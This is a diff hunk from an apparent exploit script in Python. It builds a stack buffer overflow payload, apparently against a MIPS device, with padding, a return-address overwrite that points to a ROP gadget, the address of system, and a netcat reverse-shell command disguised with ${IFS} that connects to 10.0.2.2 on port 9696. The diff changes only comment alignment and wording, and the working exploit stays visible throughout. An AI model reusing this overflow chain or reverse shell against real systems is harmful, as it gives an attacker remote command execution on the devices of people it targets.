@@ -860,21 +860,21 @@ def send_long_path(length, filler, ret_addr):
         # 0x7fffdbf4 <- Address of reverse shell string
 
         # long_path needs to be 176 total in order to overflow
-        long_path =  f"{filler}".encode() * (length-32)      # Write enough to get to s0 on stack
+        long_path =  f"{filler}".encode() * (length-32)   # Write enough to get to s0 on stack
 
-        long_path += p32(0x7fffdbe0, endian="big")           # Loads s0 with a pointer to our reverse shell string
+        long_path += p32(0x7fffdbe0, endian="big")        # Loads s0 with a pointer to our reverse shell string
 
-        long_path += b"B" * 28                               # Write some more to get to the return address 
+        long_path += b"B" * 28                            # Write some more to get to the return address 
 
-        long_path += ret_addr                                # Overwrite return address with gadget
+        long_path += ret_addr                             # Overwrite return address with gadget
 
-        long_path += p32(0x7fffdbf4, endian="big")           # Address of reverse shell string on stack (this is located at 0x7fffdbe0, hence the ptr val)
+        long_path += p32(0x7fffdbf4, endian="big")        # Address of reverse shell string on stack (this is located at 0x7fffdbe0, hence the ptr val)
 
-        long_path += b"C" * 8                                # Write some more to reach s0 + 0xc
+        long_path += b"C" * 8                             # Write some more to reach s0 + 0xc
 
-        long_path += p32(0x77fae424, endian="big")           # Loads s0 + 0xc (which eventually gets moved in $t9 via gadget)
+        long_path += p32(0x77fae424, endian="big")        # Loads s0 + 0xc with address of system (which eventually gets moved into $t9 via gadget)
 
-        long_path += b"C"*4                                  # Write some filler, and then the reverse shell string
+        long_path += b"C"*4                               # Write some filler, and then the reverse shell string
         long_path += b"rm${IFS}/tmp/p;mkfifo${IFS}/tmp/p;nc${IFS}10.0.2.2${IFS}9696</tmp/p|/bin/sh>/tmp/p"
 
 
